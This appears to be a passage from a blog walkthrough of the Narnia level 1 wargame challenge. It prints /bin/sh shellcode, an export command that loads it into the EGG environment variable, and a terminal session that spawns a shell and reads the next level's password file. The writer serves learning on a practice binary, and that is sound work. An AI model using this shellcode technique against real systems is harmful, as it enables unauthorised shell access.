The source code above is for the binary narnia1, this is a simple vulnerability. The binary looks for an environment varible called “EGG” using the getenv() function and if the environment varible is executed. Since some of the challenges from the IO series of challenges from Smashthestack.org required me to insert some shellcode into a environment varible.

```
#shellcode
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
```
The above shellcode is what I planned to use to gain a shell, it is a “/bin/sh” payload which is the same shellcode I’ve used in several challenges from my IO walkthrough blogposts, the original location of shellcode is from smashing the stack for fun and profit. Using the below the command I was able to create the environment varible called “EGG” which will contain the shellcode.

```
export EGG=$(python -c'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
```

Next I simply just executed the binary which found the environment varible called “EGG” and executed the shellcode giving me a shell and then just used the cat command to print out the contents of the narnia2 password file.

```
narnia1@melinda:/narnia$ ./narnia1
Trying to execute EGG!
$ cat /etc/narnia_pass/narnia2
```
